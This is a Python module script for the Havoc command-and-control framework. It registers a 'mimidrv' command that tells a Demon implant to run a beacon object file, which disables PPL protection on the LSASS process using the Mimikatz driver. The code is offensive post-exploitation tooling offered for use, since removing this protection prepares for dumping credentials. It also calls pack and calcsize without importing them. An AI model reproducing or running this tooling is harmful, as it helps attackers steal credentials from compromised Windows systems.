from havoc import Demon, RegisterCommand, RegisterModule
import re

class MyPacker:
    def __init__(self):
        self.buffer : bytes = b''
        self.size   : int   = 0

    def getbuffer(self):
        return pack("<L", self.size) + self.buffer

    def addstr(self, s):
        if s is None:
            s = ''
        if isinstance(s, str):
            s = s.encode("utf-8" )
        fmt = "<L{}s".format(len(s) + 1)
        self.buffer += pack(fmt, len(s)+1, s)
        self.size += calcsize(fmt)

    def addWstr(self, s):
        s = s.encode("utf-16_le")
        fmt = "<L{}s".format(len(s) + 2)
        self.buffer += pack(fmt, len(s)+2, s)
        self.size += calcsize(fmt)

    def addbytes(self, b):
        fmt = "<L{}s".format(len(b))
        self.buffer += pack(fmt, len(b), b)
        self.size += calcsize(fmt)

    def addbool(self, b):
        fmt = '<I'
        self.buffer += pack(fmt, 1 if b else 0)
        self.size += calcsize(fmt)

    def adduint32(self, n):
        fmt = '<I'
        self.buffer += pack(fmt, n)
        self.size += calcsize(fmt)

    def addshort(self, n):
        fmt = '<h'
        self.buffer += pack(fmt, n)
        self.size += calcsize(fmt)

def mimidrv( demonID, *params ):
    TaskID : str    = None
    demon  : Demon  = None
    packer = MyPacker()
    demon  = Demon( demonID )

    num_params = len(params)
    pid = ''

    if num_params < 1:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Not enough parameters" )
        return True
    elif num_params == 1:
        pid = params[ 0 ]
    elif num_params > 1:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Too many parameters" )
        return True

    try:
        pid = int( pid )
    except Exception as e:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Invalid PID" )
        return True

    packer.adduint32(pid)

    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, "Tasked demon to disable the PPL protection from LSASS" )

    demon.InlineExecute( TaskID, "go", "dist/mimidrv.x64.o", packer.getbuffer(), False )

    return TaskID

RegisterCommand( mimidrv, "", "mimidrv", "Disable PPL by interacting with the Mimidrv", 0, "<LSASS_PID>", "1337" )
